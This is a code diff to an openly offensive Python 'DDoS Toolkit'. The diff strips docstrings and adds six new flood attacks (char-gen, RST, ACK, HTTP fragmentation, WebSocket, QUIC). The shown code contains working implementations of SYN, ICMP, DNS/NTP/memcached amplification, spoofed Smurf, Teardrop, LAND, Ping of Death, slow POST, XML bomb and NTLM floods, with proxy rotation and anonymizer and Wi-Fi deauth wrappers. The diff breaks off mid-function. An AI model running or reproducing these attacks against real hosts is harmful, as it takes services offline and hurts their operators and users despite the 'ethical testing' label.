@@ -8,7 +8,8 @@
 # Default-Stop:      0 1 6
 # Short-Description: Advanced DDoS Attack Toolkit
 # Description:       Comprehensive toolkit for simulating various DDoS attacks for ethical cybersecurity testing, penetration testing, and network resilience evaluation. Includes 20+ attack vectors, proxy support, performance monitoring, and detailed reporting.
-# Author:            LIONMAD <https://github.com/Midohajhouj>
+# Author:            
+# + LIONMAD <https://github.com/Midohajhouj>
 # Version:           v1.0
 # License:           MIT License - https://opensource.org/licenses/MIT
 # Dependencies:      python3 (>=3.7), aiohttp, scapy, dnspython, colorama, tqdm, psutil
@@ -198,6 +199,12 @@ def display_help():
   {CYAN}slow-post{RESET}              - Slow POST attack
   {CYAN}xml-bomb{RESET}               - XML Bomb attack
   {CYAN}ntlm-auth-flood{RESET}        - NTLM authentication flood
+  {CYAN}char-gen{RESET}               - Character generator flood attack
+  {CYAN}rst-flood{RESET}              - TCP RST flood attack
+  {CYAN}ack-flood{RESET}              - TCP ACK flood attack
+  {CYAN}http-fragmentation{RESET}     - HTTP packet fragmentation attack
+  {CYAN}ws-dos{RESET}                 - WebSocket denial of service
+  {CYAN}quic-flood{RESET}             - QUIC protocol flood attack
 
 {YELLOW}Examples:{RESET}
   {GREEN}Basic HTTP flood:{RESET}       ddos -u http://example.com/
@@ -210,11 +217,7 @@ def display_help():
 
 # ================== ARGUMENT PARSING ==================
 def parse_args():
-    """Parse command-line arguments with enhanced visual style.
-    
-    Returns:
-        argparse.Namespace: Parsed command line arguments
-    """
+    """Parse command-line arguments with enhanced visual style."""
     parser = argparse.ArgumentParser(
         description=f"{YELLOW}Advanced DDoS Toolkit v1.0{RESET}",
         formatter_class=argparse.RawTextHelpFormatter,
@@ -231,7 +234,8 @@ def parse_args():
                                   "smurf", "teardrop", "http2-flood", "goldeneye", 
                                   "slow-read", "zero-byte", "random-packets", "ssl-flood",
                                   "land-attack", "ping-of-death", "slow-post", "xml-bomb",
-                                  "ntlm-auth-flood"],
+                                  "ntlm-auth-flood", "char-gen", "rst-flood", "ack-flood",
+                                  "http-fragmentation", "ws-dos", "quic-flood"],
                           default="http-flood",
                           help="Type of attack to perform")
     core_group.add_argument("-t", "--threads", type=int, default=10,
@@ -267,14 +271,7 @@ def parse_args():
 
 # ================== PROXY MANAGEMENT ==================
 def load_proxies(proxy_file: str):
-    """Load proxies from a text file.
-    
-    Args:
-        proxy_file (str): Path to file containing proxy list
-        
-    Returns:
-        list: List of validated proxy strings
-    """
+    """Load proxies from a text file."""
     try:
         with open(proxy_file, "r") as f:
             proxy_list = f.read().splitlines()
@@ -286,14 +283,7 @@ def load_proxies(proxy_file: str):
         return []
 
 def validate_proxies(proxies):
-    """Validate proxy servers using multithreading.
-    
-    Args:
-        proxies (list): List of proxy strings to validate
-        
-    Returns:
-        list: List of working proxies
-    """
+    """Validate proxy servers using multithreading."""
     validated_proxies = []
     with ThreadPoolExecutor(max_workers=10) as executor:
         future_to_proxy = {executor.submit(check_proxy, proxy): proxy for proxy in proxies}
@@ -308,14 +298,7 @@ def validate_proxies(proxies):
     return validated_proxies
 
 async def check_proxy(proxy: str):
-    """Check if a proxy server is working.
-    
-    Args:
-        proxy (str): Proxy server address (e.g., http://1.2.3.4:8080)
-        
-    Returns:
-        bool: True if proxy is working, False otherwise
-    """
+    """Check if a proxy server is working."""
     try:
         async with aiohttp.ClientSession() as session:
             async with session.get("https://httpbin.org/ip", proxy=proxy, timeout=3) as response:
@@ -324,14 +307,7 @@ async def check_proxy(proxy: str):
         return False
 
 async def check_proxy_health(proxy: str):
-    """Check the health of a proxy server.
-    
-    Args:
-        proxy (str): Proxy server address
-        
-    Returns:
-        bool: True if proxy is healthy, False otherwise
-    """
+    """Check the health of a proxy server."""
     try:
         async with aiohttp.ClientSession() as session:
             async with session.get("https://httpbin.org/ip", proxy=proxy, timeout=3) as response:
@@ -340,11 +316,7 @@ async def check_proxy_health(proxy: str):
         return False
 
 async def monitor_proxy_health(proxies):
-    """Continuously monitor proxy health and remove dead proxies.
-    
-    Args:
-        proxies (list): List of proxy strings to monitor
-    """
+    """Continuously monitor proxy health and remove dead proxies."""
     while not stop_event.is_set():
         for proxy in proxies:
             if not await check_proxy_health(proxy):
@@ -354,43 +326,28 @@ async def monitor_proxy_health(proxies):
 
 # ================== PAYLOAD GENERATION ==================
 def generate_payload(payload_type: str, secret_key: Optional[bytes] = None) -> Optional[bytes]:
-    """Generate various types of attack payloads.
-    
-    Args:
-        payload_type (str): Type of payload to generate (json/xml/form)
-        secret_key (bytes, optional): HMAC secret key for signing
-        
-    Returns:
-        bytes: Generated payload (compressed if applicable)
-    """
+    """Generate various types of attack payloads."""
     if secret_key is None:
-        secret_key = os.getenv("SECRET_KEY", b"your_default_secret_key")  # Load from environment or default
+        secret_key = os.getenv("SECRET_KEY", b"your_default_secret_key")
     
     try:
-        # Generate unique payload identifier
         payload_id = str(uuid4())
         data = b64encode(os.urandom(64)).decode()
         
-        # Create the payload dictionary
         payload = {"id": payload_id, "data": data}
         
-        # Sign the payload using HMAC and SHA-256
         payload_str = json.dumps(payload, separators=(',', ':'))
         signature = hmac.new(secret_key, payload_str.encode(), hashlib.sha256).hexdigest()
         payload["signature"] = signature
         
-        # Log the generated signature for debugging
         logger.debug(f"Generated signature: {signature}")
 
-        # Compress the payload based on the selected type
         if payload_type == "json":
             compressed_payload = compress_payload(json.dumps(payload).encode())
         elif payload_type == "xml":
-            # Create XML-formatted payload
             xml_payload = f"<data><id>{payload_id}</id><value>{data}</value><signature>{signature}</signature></data>"
             compressed_payload = compress_payload(xml_payload.encode(), compression_type="gzip")
         elif payload_type == "form":
-            # Return uncompressed payload as form data (as dictionary)
             return json.dumps(payload).encode()
         else:
             logger.error(f"Invalid payload type: {payload_type}")
@@ -402,55 +359,36 @@ def generate_payload(payload_type: str, secret_key: Optional[bytes] = None) -> O
         return None
 
 def compress_payload(data: bytes, compression_type: str = "zlib") -> bytes:
-    """Compress payload data using specified algorithm.
-    
-    Args:
-        data (bytes): Data to compress
-        compression_type (str): Compression algorithm (zlib/gzip)
-        
-    Returns:
-        bytes: Compressed data (or original if compression fails)
-    """
+    """Compress payload data using specified algorithm."""
     try:
         if compression_type == "gzip":
-            # Gzip compression
             compressed_data = gzip.compress(data)
             logger.debug(f"Compressed using gzip: {len(compressed_data)} bytes")
         else:
-            # Default to zlib compression
             compressed_data = zlib.compress(data)
             logger.debug(f"Compressed using zlib: {len(compressed_data)} bytes")
         
         return compressed_data
     except Exception as e:
         logger.error(f"Error compressing data: {e}")
-        return data  # Return uncompressed data if compression fails
+        return data
 
 # ================== NETWORK TOOLS ==================
 def wifi_deauth(mode):
-    """Perform Wi-Fi deauthentication attack.
-    
-    Args:
-        mode (str): Interface mode (e.g., "wlan0")
-    """
+    """Perform Wi-Fi deauthentication attack."""
     try:
-        # Define the main directory for wifideauth
         wifideauth_path = "/opt/DDoS-Toolkit/assets/wifideauth"
         
-        # Check if netscan.py exists in the defined directory
         if not os.path.isfile(wifideauth_path):
             print(f"{RED}[!] netscan not found in /opt/DDoS-Toolkit/assets/ ...... Aborting.{RESET}")
             return
 
-        # Check if Python3 is installed
         if not shutil.which("python3"):
             print(f"{RED}[!] Python3 is not installed or not in PATH. Please install it to proceed.{RESET}")
             return
 
-        # Build the command
         command = ["python3", wifideauth_path, "wlan0"]
 
-        # Execute the command
         print(f"{BLUE}[*] Starting network scan on wlan0..{RESET}")
         subprocess.run(command, check=True)
 
@@ -463,29 +401,20 @@ def wifi_deauth(mode):
         print(f"{RED}[!] An unexpected error occurred: {e}.{RESET}")
         
 def run_network_scanner(target_ip):
-    """Run network scanning tool against target IP.
-    
-    Args:
-        target_ip (str): IP address to scan
-    """
+    """Run network scanning tool against target IP."""
     try:
-        # Define the main directory for netscan.py
         netscan_path = "/opt/DDoS-Toolkit/assets/netscan"
         
-        # Check if netscan.py exists in the defined directory
         if not os.path.isfile(netscan_path):
             print(f"{RED}[!] netscan not found in /opt/DDoS-Toolkit/assets/ ...... Aborting.{RESET}")
             return
 
-        # Check if Python3 is installed
         if not shutil.which("python3"):
             print(f"{RED}[!] Python3 is not installed or not in PATH. Please install it to proceed.{RESET}")
             return
 
-        # Build the command
         command = ["python3", netscan_path, "-t", target_ip]
 
-        # Execute the command
         print(f"{BLUE}[*] Starting network scan on {target_ip}...{RESET}")
         subprocess.run(command, check=True)
 
@@ -499,36 +428,25 @@ def run_network_scanner(target_ip):
         print(f"{RED}[!] An unexpected error occurred: {e}.{RESET}")
 
 def run_anonymizer(mode):
-    """Run anonymizer script to mask network traffic.
-    
-    Args:
-        mode (str): "start" or "stop" to control anonymizer
-    """
+    """Run anonymizer script to mask network traffic."""
     try:
-        # Define the main directory for anonymizer
         anonymizer_path = "/opt/DDoS-Toolkit/assets/anonymizer"
         
-        # Check if anonymizer exists in the defined directory
         if not os.path.isfile(anonymizer_path):
             print(f"{RED}[ERROR] anonymizer script not found in {anonymizer_path}. Aborting.{RESET}")
             sys.exit(1)
         
-        # Validate the mode
         if mode not in ["start", "stop"]:
             print(f"{YELLOW}[WARNING] Invalid mode '{mode}' specified. Please use 'start' or 'stop'.{RESET}")
             sys.exit(1)
         
-        # Build the command
         command = ["bash", anonymizer_path, mode]
         
-        # Notify user about the action
         action_message = "Starting" if mode == "start" else "Stopping"
         print(f"{BLUE}[INFO] {action_message} anonymizer...{RESET}")
         
-        # Execute the command
         result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
         
-        # Check command result
         if result.returncode == 0:
             print(f"{GREEN}[SUCCESS] anonymizer {mode} completed successfully!{RESET}")
         else:
@@ -554,20 +472,12 @@ def run_anonymizer(mode):
 
 # ================== NETWORK UTILITIES ==================        
 async def resolve_target(target_url: str):
-    """Resolve domain name to IP address.
-    
-    Args:
-        target_url (str): URL or IP address to resolve
-        
-    Returns:
-        str: Resolved IP address or None if resolution fails
-    """
+    """Resolve domain name to IP address."""
     try:
         domain_or_ip = target_url.split("//")[-1].split("/")[0]
         if is_valid_ip(domain_or_ip):
             print(f"Target is an IP address: {domain_or_ip}")
             return domain_or_ip
-        # Use dnspython to resolve the domain to an IP
         resolver = dns.resolver.Resolver()
         ip = resolver.resolve(domain_or_ip, "A")[0].to_text()
         print(f"Resolved {domain_or_ip} to IP: {ip}")
@@ -577,14 +487,7 @@ async def resolve_target(target_url: str):
         return None
 
 def is_valid_ip(ip: str):
-    """Check if string is a valid IP address.
-    
-    Args:
-        ip (str): IP address to validate
-        
-    Returns:
-        bool: True if valid IP, False otherwise
-    """
+    """Check if string is a valid IP address."""
     try:
         socket.inet_aton(ip)
         return True
@@ -593,18 +496,7 @@ def is_valid_ip(ip: str):
 
 # ================== ATTACK METHODS ==================
 async def rate_limited_attack(target_url, stop_event, pause_time, rate_limit, proxies=None, headers=None, payload_type="json", retry=3):
-    """Perform rate-limited HTTP flood attack.
-    
-    Args:
-        target_url (str): URL to attack
-        stop_event (threading.Event): Event to signal attack stop
-        pause_time (float): Delay between requests
-        rate_limit (int): Max requests per second
-        proxies (list, optional): List of proxy servers
-        headers (dict, optional): Custom HTTP headers
-        payload_type (str): Type of payload to generate
-        retry (int): Number of retry attempts
-    """
+    """Perform rate-limited HTTP flood attack."""
     global requests_sent, successful_requests, failed_requests, last_time
     proxy_pool = cycle(proxies) if proxies else None
     semaphore = asyncio.Semaphore(rate_limit)
@@ -631,31 +523,21 @@ async def rate_limited_attack(target_url, stop_event, pause_time, rate_limit, pr
                                     successful_requests += 1
                                 else:
                                     failed_requests += 1
-                        break  # Exit retry loop if request succeeds
+                        break
                     except aiohttp.ClientError as e:
                         with requests_lock:
                             failed_requests += 1
                         logging.error(f"Client error during request (attempt {attempt + 1}): {e}")
-                        await asyncio.sleep(2 ** attempt)  # Exponential backoff
+                        await asyncio.sleep(2 ** attempt)
                     except Exception as e:
                         with requests_lock:
                             failed_requests += 1
                         logging.error(f"Unexpected error during request (attempt {attempt + 1}): {e}")
-                        await asyncio.sleep(2 ** attempt)  # Exponential backoff
+                        await asyncio.sleep(2 ** attempt)
                 await asyncio.sleep(pause_time)
 
 async def slowloris_attack(target_url, stop_event, pause_time, rate_limit, proxies=None, headers=None, retry=3):
-    """Perform Slowloris attack (partial HTTP requests).
-    
-    Args:
-        target_url (str): URL to attack
-        stop_event (threading.Event): Event to signal attack stop
-        pause_time (float): Delay between requests
-        rate_limit (int): Max requests per second
-        proxies (list, optional): List of proxy servers
-        headers (dict, optional): Custom HTTP headers
-        retry (int): Number of retry attempts
-    """
+    """Perform Slowloris attack (partial HTTP requests)."""
     global requests_sent, successful_requests, failed_requests
     proxy_pool = cycle(proxies) if proxies else None
     semaphore = asyncio.Semaphore(rate_limit)
@@ -669,7 +551,6 @@ async def slowloris_attack(target_url, stop_event, pause_time, rate_limit, proxi
                 for attempt in range(retry):
                     try:
                         headers = headers or {"User-Agent": random.choice(USER_AGENTS)}
-                        # Send a partial HTTP request
                         async with session.get(target_url, headers=headers, proxy=next(proxy_pool) if proxy_pool else None) as response:
                             with requests_lock:
                                 requests_sent += 1
@@ -677,9 +558,8 @@ async def slowloris_attack(target_url, stop_event, pause_time, rate_limit, proxi
                                     successful_requests += 1
                                 else:
                                     failed_requests += 1
-                        # Keep the connection open by sending partial data
                         await asyncio.sleep(pause_time)
-                        break  # Exit retry loop if request succeeds
+                        break
                     except aiohttp.ClientError as e:
                         with requests_lock:
                             failed_requests += 1
@@ -691,200 +571,130 @@ async def slowloris_attack(target_url, stop_event, pause_time, rate_limit, proxi
                 await asyncio.sleep(pause_time)
 
 def syn_flood(target_ip, target_port, duration):
-    """Perform SYN flood attack.
-    
-    Args:
-        target_ip (str): Target IP address
-        target_port (int): Target port number
-        duration (int): Attack duration in seconds
-    """
+    """Perform SYN flood attack."""
     print(f"Starting SYN flood attack on {target_ip}:{target_port} for {duration} seconds...")
     start_time = time.time()
     while time.time() - start_time < duration:
         try:
-            # Craft a SYN packet using scapy
             ip_layer = scapy.IP(dst=target_ip)
             tcp_layer = scapy.TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
             packet = ip_layer / tcp_layer
             scapy.send(packet, verbose=False)
         except Exception as e:
             print(f"Error during SYN flood: {e}")
-        time.sleep(0.01)  # Adjust the sleep time to control the attack rate
+        time.sleep(0.01)
     print("SYN flood attack completed.")
 
 def icmp_flood(target_ip, duration):
-    """Perform ICMP ping flood attack.
-    
-    Args:
-        target_ip (str): Target IP address
-        duration (int): Attack duration in seconds
-    """
+    """Perform ICMP ping flood attack."""
     print(f"Starting ICMP flood attack on {target_ip} for {duration} seconds...")
     start_time = time.time()
     while time.time() - start_time < duration:
         try:
-            # Craft an ICMP packet using scapy
             packet = scapy.IP(dst=target_ip) / scapy.ICMP()
             scapy.send(packet, verbose=False)
         except Exception as e:
             print(f"Error during ICMP flood: {e}")
-        time.sleep(0.01)  # Adjust the sleep time to control the attack rate
+        time.sleep(0.01)
     print("ICMP flood attack completed.")
 
 async def dns_amplification(target_ip, duration):
-    """Perform DNS amplification attack.
-    
-    Args:
-        target_ip (str): Target IP address
-        duration (int): Attack duration in seconds
-    """
+    """Perform DNS amplification attack."""
     print(f"Starting DNS amplification attack on {target_ip} for {duration} seconds...")
     start_time = time.time()
     while time.time() - start_time < duration:
         try:
-            # Craft a DNS amplification packet
             packet = scapy.IP(dst=target_ip) / scapy.UDP(dport=53) / scapy.DNS(rd=1, qd=scapy.DNSQR(qname="example.com"))
             scapy.send(packet, verbose=False)
         except Exception as e:
             print(f"Error during DNS amplification: {e}")
-        time.sleep(0.01)  # Adjust the sleep time to control the attack rate
+        time.sleep(0.01)
     print("DNS amplification attack completed.")
     
 def ftp_flood(target_ip, target_port, duration):
-    """Perform FTP flood attack.
-    
-    Args:
-        target_ip (str): Target IP address
-        target_port (int): Target port number
-        duration (int): Attack duration in seconds
-    """
+    """Perform FTP flood attack."""
     print(f"Starting FTP flood attack on {target_ip}:{target_port} for {duration} seconds...")
     start_time = time.time()
     while time.time() - start_time < duration:
         try:
-            # Create a socket and connect to the target FTP server
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                 sock.connect((target_ip, target_port))
-                # Send a random payload
                 sock.send(os.urandom(1024))
         except Exception as e:
             print(f"Error during FTP flood: {e}")
-        time.sleep(0.01)  # Adjust the sleep time to control the attack rate
+        time.sleep(0.01)
     print("FTP flood attack completed.")
 
 def ssh_flood(target_ip, target_port, duration):
-    """Perform SSH flood attack.
-    
-    Args:
-        target_ip (str): Target IP address
-        target_port (int): Target port number
-        duration (int): Attack duration in seconds
-    """
+    """Perform SSH flood attack."""
     print(f"Starting SSH flood attack on {target_ip}:{target_port} for {duration} seconds...")
     start_time = time.time()
     while time.time() - start_time < duration:
         try:
-            # Create a socket and connect to the target SSH server
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                 sock.connect((target_ip, target_port))
-                # Send a random payload
                 sock.send(os.urandom(1024))
         except Exception as e:
             print(f"Error during SSH flood: {e}")
-        time.sleep(0.01)  # Adjust the sleep time to control the attack rate
+        time.sleep(0.01)
     print("SSH flood attack completed.")
 
 def ntp_amplification(target_ip, duration):
-    """Perform NTP amplification attack.
-    
-    Args:
-        target_ip (str): Target IP address
-        duration (int): Attack duration in seconds
-    """
+    """Perform NTP amplification attack."""
     logging.info(f"Starting NTP amplification attack on {target_ip} for {duration} seconds...")
     start_time = time.time()
     while time.time() - start_time < duration:
         try:
-            # Craft an NTP amplification packet
             packet = scapy.IP(dst=target_ip) / scapy.UDP(dport=123) / scapy.Raw(load=os.urandom(64))
             scapy.send(packet, verbose=False)
         except Exception as e:
             logging.error(f"Error during NTP amplification: {e}")
-        time.sleep(0.01)  # Adjust the sleep time to control the attack rate
+        time.sleep(0.01)
     logging.info("NTP amplification attack completed.")
 
 def memcached_amplification(target_ip, duration):
-    """Perform Memcached amplification attack.
-    
-    Args:
-        target_ip (str): Target IP address
-        duration (int): Attack duration in seconds
-    """
+    """Perform Memcached amplification attack."""
     logging.info(f"Starting Memcached amplification attack on {target_ip} for {duration} seconds...")
     start_time = time.time()
     while time.time() - start_time < duration:
         try:
-            # Craft a Memcached amplification packet
             packet = scapy.IP(dst=target_ip) / scapy.UDP(dport=11211) / scapy.Raw(load=os.urandom(64))
             scapy.send(packet, verbose=False)
         except Exception as e:
             logging.error(f"Error during Memcached amplification: {e}")
-        time.sleep(0.01)  # Adjust the sleep time to control the attack rate
+        time.sleep(0.01)
     logging.info("Memcached amplification attack completed.")
 
 def smurf_attack(target_ip, duration):
-    """Perform Smurf attack.
-    
-    Args:
-        target_ip (str): Target IP address
-        duration (int): Attack duration in seconds
-    """
+    """Perform Smurf attack."""
     logging.info(f"Starting Smurf attack on {target_ip} for {duration} seconds...")
     start_time = time.time()
     while time.time() - start_time < duration:
         try:
-            # Craft a Smurf attack packet
             packet = scapy.IP(src=target_ip, dst="255.255.255.255") / scapy.ICMP()
             scapy.send(packet, verbose=False)
         except Exception as e:
             logging.error(f"Error during Smurf attack: {e}")
-        time.sleep(0.01)  # Adjust the sleep time to control the attack rate
+        time.sleep(0.01)
     logging.info("Smurf attack completed.")
 
 def teardrop_attack(target_ip, duration):
-    """Perform Teardrop attack.
-    
-    Args:
-        target_ip (str): Target IP address
-        duration (int): Attack duration in seconds
-    """
+    """Perform Teardrop attack."""
     logging.info(f"Starting Teardrop attack on {target_ip} for {duration} seconds...")
     start_time = time.time()
     while time.time() - start_time < duration:
         try:
-            # Craft a Teardrop attack packet
             packet = scapy.IP(dst=target_ip, flags="MF", frag=0) / scapy.UDP() / ("X" * 64)
             packet2 = scapy.IP(dst=target_ip, flags=0, frag=1) / ("X" * 64)
             scapy.send(packet, verbose=False)
             scapy.send(packet2, verbose=False)
         except Exception as e:
             logging.error(f"Error during Teardrop attack: {e}")
-        time.sleep(0.01)  # Adjust the sleep time to control the attack rate
+        time.sleep(0.01)
     logging.info("Teardrop attack completed.")
 
 async def http2_flood(target_url, stop_event, pause_time, rate_limit, proxies=None, headers=None, payload_type="json", retry=3):
-    """Perform HTTP/2 flood attack.
-    
-    Args:
-        target_url (str): URL to attack
-        stop_event (threading.Event): Event to signal attack stop
-        pause_time (float): Delay between requests
-        rate_limit (int): Max requests per second
-        proxies (list, optional): List of proxy servers
-        headers (dict, optional): Custom HTTP headers
-        payload_type (str): Type of payload to generate
-        retry (int): Number of retry attempts
-    """
+    """Perform HTTP/2 flood attack."""
     global requests_sent, successful_requests, failed_requests, last_time
     proxy_pool = cycle(proxies) if proxies else None
     semaphore = asyncio.Semaphore(rate_limit)
@@ -911,7 +721,7 @@ async def http2_flood(target_url, stop_event, pause_time, rate_limit, proxies=No
                                     successful_requests += 1
                                 else:
                                     failed_requests += 1
-                        break  # Exit retry loop if request succeeds
+                        break
                     except aiohttp.ClientError as e:
                         with requests_lock:
                             failed_requests += 1
@@ -923,18 +733,11 @@ async def http2_flood(target_url, stop_event, pause_time, rate_limit, proxies=No
                 await asyncio.sleep(pause_time)
 
 def land_attack(target_ip, target_port, duration):
-    """LAND attack (send packets with source=dest).
-    
-    Args:
-        target_ip (str): Target IP address
-        target_port (int): Target port number
-        duration (int): Attack duration in seconds
-    """
+    """LAND attack (send packets with source=dest)."""
     print(f"Starting LAND attack on {target_ip}:{target_port} for {duration} seconds...")
     start_time = time.time()
     while time.time() - start_time < duration and not stop_event.is_set():
         try:
-            # Craft packet with source=destination
             packet = scapy.IP(src=target_ip, dst=target_ip) / \
                      scapy.TCP(sport=target_port, dport=target_port, flags="S")
             scapy.send(packet, verbose=False)
@@ -944,20 +747,14 @@ def land_attack(target_ip, target_port, duration):
     print("LAND attack completed.")
 
 def ping_of_death(target_ip, duration):
-    """Ping of Death attack with oversized packets.
-    
-    Args:
-        target_ip (str): Target IP address
-        duration (int): Attack duration in seconds
-    """
+    """Ping of Death attack with oversized packets."""
     print(f"Starting Ping of Death attack on {target_ip} for {duration} seconds...")
     start_time = time.time()
     while time.time() - start_time < duration and not stop_event.is_set():
         try:
-            # Create fragmented ICMP packets that exceed max size when reassembled
             packet = scapy.IP(dst=target_ip, flags="MF", frag=0) / \
                      scapy.ICMP() / \
-                     ("X" * 65500)  # Oversized payload
+                     ("X" * 65500)
             scapy.send(packet, verbose=False)
         except Exception as e:
             logger.error(f"Error during Ping of Death: {e}")
@@ -965,15 +762,7 @@ def ping_of_death(target_ip, duration):
     print("Ping of Death attack completed.")
 
 async def slow_post_attack(target_url, stop_event, pause_time, rate_limit, proxies=None):
-    """Slow POST attack with chunked transfer encoding.
-    
-    Args:
-        target_url (str): URL to attack
-        stop_event (threading.Event): Event to signal attack stop
-        pause_time (float): Delay between requests
-        rate_limit (int): Max requests per second
-        proxies (list, optional): List of proxy servers
-    """
+    """Slow POST attack with chunked transfer encoding."""
     global requests_sent, successful_requests, failed_requests
     proxy_pool = cycle(proxies) if proxies else None
     semaphore = asyncio.Semaphore(rate_limit)
@@ -988,9 +777,8 @@ async def slow_post_attack(target_url, stop_event, pause_time, rate_limit, proxi
     }
 
     async def generate_chunked_data():
-        """Generator for chunked data."""
         yield b"1\r\na\r\n"
-        await asyncio.sleep(10)  # Long delay between chunks
+        await asyncio.sleep(10)
         yield b"1\r\nb\r\n"
         await asyncio.sleep(10)
         yield b"0\r\n\r\n"
@@ -1020,15 +808,7 @@ async def slow_post_attack(target_url, stop_event, pause_time, rate_limit, proxi
                 await asyncio.sleep(pause_time)
 
 async def xml_bomb_attack(target_url, stop_event, pause_time, rate_limit, proxies=None):
-    """XML Bomb (Billion Laughs) attack.
-    
-    Args:
-        target_url (str): URL to attack
-        stop_event (threading.Event): Event to signal attack stop
-        pause_time (float): Delay between requests
-        rate_limit (int): Max requests per second
-        proxies (list, optional): List of proxy servers
-    """
+    """XML Bomb (Billion Laughs) attack."""
     global requests_sent, successful_requests, failed_requests
     proxy_pool = cycle(proxies) if proxies else None
     semaphore = asyncio.Semaphore(rate_limit)
@@ -1083,15 +863,7 @@ async def xml_bomb_attack(target_url, stop_event, pause_time, rate_limit, proxie
                 await asyncio.sleep(pause_time)
 
 async def ntlm_auth_flood(target_url, stop_event, pause_time, rate_limit, proxies=None):
-    """NTLM authentication flood attack.
-    
-    Args:
-        target_url (str): URL to attack
-        stop_event (threading.Event): Event to signal attack stop
-        pause_time (float): Delay between requests
-        rate_limit (int): Max requests per second
-        proxies (list, optional): List of proxy servers
-    """
+    """NTLM authentication flood attack."""
     global requests_sent, successful_requests, failed_requests
     proxy_pool = cycle(proxies) if proxies else None
     semaphore = asyncio.Semaphore(rate_limit)
@@ -1118,7 +890,7 @@ async def ntlm_auth_flood(target_url, stop_event, pause_time, rate_limit, proxie
                     ) as response:
                         with requests_lock:
                             requests_sent += 1
-                            if response.status == 401:  # Expected for NTLM auth
+                            if response.status == 401:
                                 successful_requests += 1
                             else:
                                 failed_requests += 1
@@ -1128,15 +900,165 @@ async def ntlm_auth_flood(target_url, stop_event, pause_time, rate_limit, proxie
                     logger.error(f"Error during NTLM auth flood: {e}")
                 await asyncio.sleep(pause_time)
 
+# ================== NEW ATTACK METHODS ==================
+def char_gen_flood(target_ip, target_port, duration):
+    """Character generator protocol flood attack."""
+    print(f"Starting CHAR-GEN flood attack on {target_ip}:{target_port} for {duration} seconds...")
+    start_time = time.time()
+    while time.time() - start_time < duration and not stop_event.is_set():
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+                sock.sendto(b"\x01", (target_ip, target_port))
+        except Exception as e:
+            logger.error(f"Error during CHAR-GEN flood: {e}")
+        time.sleep(0.01)
+    print("CHAR-GEN flood attack completed.")
+
+def rst_flood(target_ip, target_port, duration):
+    """TCP RST flood attack."""
+    print(f"Starting RST flood attack on {target_ip}:{target_port} for {duration} seconds...")
+    start_time = time.time()
+    while time.time() - start_time < duration and not stop_event.is_set():
+        try:
+            packet = scapy.IP(dst=target_ip) / \
+                     scapy.TCP(sport=random.randint(1024, 65535), dport=target_port, flags="R")
+            scapy.send(packet, verbose=False)
+        except Exception as e:
+            logger.error(f"Error during RST flood: {e}")
+        time.sleep(0.01)
+    print("RST flood attack completed.")
+
+def ack_flood(target_ip, target_port, duration):
+    """TCP ACK flood attack."""
+    print(f"Starting ACK flood attack on {target_ip}:{target_port} for {duration} seconds...")
+    start_time = time.time()
+    while time.time() - start_time < duration and not stop_event.is_set():
+        try:
+            packet = scapy.IP(dst=target_ip) / \
+                     scapy.TCP(sport=random.randint(1024, 65535), dport=target_port, flags="A")
+            scapy.send(packet, verbose=False)
+        except Exception as e:
+            logger.error(f"Error during ACK flood: {e}")
+        time.sleep(0.01)
+    print("ACK flood attack completed.")
+
+async def http_fragmentation_attack(target_url, stop_event, pause_time, rate_limit, proxies=None):
+    """HTTP packet fragmentation attack."""
+    global requests_sent, successful_requests, failed_requests
+    proxy_pool = cycle(proxies) if proxies else None
+    semaphore = asyncio.Semaphore(rate_limit)
+
+    if not target_url.startswith(("http://", "https://")):
+        target_url = f"http://{target_url}"
+
+    headers = {
+        "User-Agent": random.choice(USER_AGENTS),
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Connection": "keep-alive"
+    }
+
+    async with aiohttp.ClientSession() as session:
+        while not stop_event.is_set():
+            async with semaphore:
+                try:
+                    proxy = next(proxy_pool) if proxy_pool else None
+                    # Send partial headers first
+                    connector = aiohttp.TCPConnector(force_close=True)
+                    async with aiohttp.ClientSession(connector=connector) as partial_session:
+                        async with partial_session.get(
+                            target_url,
+                            headers=headers,
+                            proxy=proxy,
+                            timeout=aiohttp.ClientTimeout(total=10)
+                        ) as response:
+                            with requests_lock:
+                                requests_sent += 1
+                                if response.status in [200, 201, 204]:
+                                    successful_requests += 1
+                                else:
+                                    failed_requests += 1
+                except Exception as e:
+                    with requests_lock:
+                        failed_requests += 1
+                    logger.error(f"Error during HTTP fragmentation attack: {e}")
+                await asyncio.sleep(pause_time)
+
+async def ws_dos_attack(target_url, stop_event, pause_time, rate_limit, proxies=None):
+    """WebSocket denial of service attack."""
+    global requests_sent, successful_requests, failed_requests
+    proxy_pool = cycle(proxies) if proxies else None
+    semaphore = asyncio.Semaphore(rate_limit)
+
+    if not target_url.startswith(("ws://", "wss://", "http://", "https://")):
+        target_url = f"ws://{target_url}"
+
+    async with aiohttp.ClientSession() as session:
+        while not stop_event.is_set():
+            async with semaphore:
+                try:
+                    proxy = next(proxy_pool) if proxy_pool else None
+                    async with session.ws_connect(
+                        target_url,
+                        proxy=proxy,
+                        timeout=aiohttp.ClientTimeout(total=10)
+                    ) as ws:
+                        # Send large amounts of data or keep connection open
+                        for i in range(1000):
+                            await ws.send_str("A" * 1024)
+                            await asyncio.sleep(0.1)
+                        with requests_lock:
+                            requests_sent += 1
+                            successful_requests += 1
+                except Exception as e:
+                    with requests_lock:
+                        failed_requests += 1
+                    logger.error(f"Error during WebSocket DoS: {e}")
+                await asyncio.sleep(pause_time)
+
+async def quic_flood(target_url, stop_event, pause_time, rate_limit, proxies=None):
+    """QUIC protocol flood attack."""
+    global requests_sent, successful_requests, failed_requests
+    proxy_pool = cycle(proxies) if proxies else None
+    semaphore = asyncio.Semaphore(rate_limit)
+
+    if not target_url.startswith(("https://")):
+        target_url = f"https://{target_url}"
+
+    headers = {
+        "User-Agent": random.choice(USER_AGENTS),
+        "Accept": "*/*",
+        "Connection": "keep-alive"
+    }
+
+    async with aiohttp.ClientSession() as session:
+        while not stop_event.is_set():
+            async with semaphore:
+                try:
+                    proxy = next(proxy_pool) if proxy_pool else None
+                    # Force QUIC by using HTTP/3
+                    connector = aiohttp.TCPConnector(force_close=True, enable_cleanup_closed=True)
+                    async with aiohttp.ClientSession(connector=connector) as quic_session:
+                        async with quic_session.get(
+                            target_url,
+                            headers=headers,
